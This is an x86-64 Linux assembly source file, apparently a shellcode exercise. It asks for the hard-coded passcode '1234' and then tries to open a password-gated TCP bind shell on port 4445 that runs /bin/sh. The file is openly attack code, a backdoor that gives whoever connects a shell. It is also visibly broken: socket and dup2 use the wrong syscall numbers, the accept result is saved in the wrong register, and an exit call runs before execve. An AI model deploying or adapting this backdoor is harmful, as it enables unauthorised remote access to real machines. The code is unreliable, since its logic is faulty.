global _start

section .text
_start:
	jmp call_main

exit_gracefully:
	;exit syscall
	xor rax, rax
	add rax, 60
	xor rdi, rdi
	syscall

exec_tcp_bind_shell:
	createSocket: ; 41(rax)(2(rdi),1(rsi),0 or 6(rdx))
	xor rax, rax
	xor rdx, rdx
	xor rsi, rsi
	xor rdi, rdi

	; Socket Call
	mov ah, 41
	add rdi, 2
	inc sil
	xor rdx, rdx
	syscall
	mov rdi, rax ; save return value of socket i.e fd

	; Structure to bind needs to be pushed on stack - reverse order or args
	xor rax, rax
	push rax ; all interfaces (0)
	push dword 0x5d11 ; 4445 port
	push 0x02 ; AF_INET

	;Bind Call
	mov rsi, rsp ; base addr of struct
	xor rax, rax
	add rax, 49
	add rdx, 16
	syscall

	;Listen Call
	xor rax, rax
	add rax, 50
	xor rsi, rsi
	add rsi, 5
	syscall
	
	;Accept Call
	xor rax, rax
	add rax, 43
	xor rsi, rsi
	xor rdx, rdx
	syscall
	mov rax, rbx ; save return value of accept

	;Duplicate client FD to stdin/stdout/stderr
	mov rdi, rbx
	xor rax, rax
	add rax, 43
	xor rsi, rsi
	syscall

	xor rax, rax
	add rax, 43
	inc rsi
	syscall
	
	xor rax, rax
	add rax, 43
	inc rsi
	syscall

	;Exit syscall
	xor rax, rax
	mov rax, 60
	mov rdi, 11
	syscall

	call bind_tcp_shell

bind_tcp_shell:
	; argv[] = {"sh", NULL, NULL}
	; execve("/bin/sh", argv, NULL)
	xor rax, rax
	push rax
	mov rdx, rsp
	mov rbx, 0x68732f6e69622f2f
	push rbx
	push rdi
	mov rsi, rsp
	add rax, 59	
	syscall	

password_ok:
	;write to console
	xor rax, rax
	mov al, 1
	mov rdi, rax
	mov rsi, exec_print
	mov rdx, lenexec
	syscall
	jmp exec_tcp_bind_shell

exec_shellcode:

validate_and_jump:
	pop rsi

	;write to console
	xor rax, rax
	mov al, 1
	mov rdi, rax
	mov rdx, rdi
	add rdx, 32
	syscall

	;read from stdin
	xor rax, rax
	mov al, 0; syscall num for read
	mov rdi, 0; fd for stdin
	mov rsi, readbuf
	mov rdx, 4
	syscall	

	;save read bytes
	;push rax

	;print user input bytes those were read exactly
	;xor rax, rax
	;mov al, 1
	;mov rdi, 1
	;pop rdx
	;syscall

	cld
	;xor rax, rax
	;xor rdi, rdi
	lea rax, [readbuf]
	;mov rax, 1234
	lea rdi, [passcode]
	cmpsq
	jz password_ok
	
	;call exit_gracefully

call_main:
	call validate_and_jump
	password: db 'Enter Passcode to Exec Shellcode', 0xa

section .data
	readbuf: times 64 dq 0
	;lenbuf: equ $-readbuf
	passcode: dq '1234', 0xa
	exec_print: dq 'Executing ShellCode', 0xa
	lenexec: equ $-exec_print
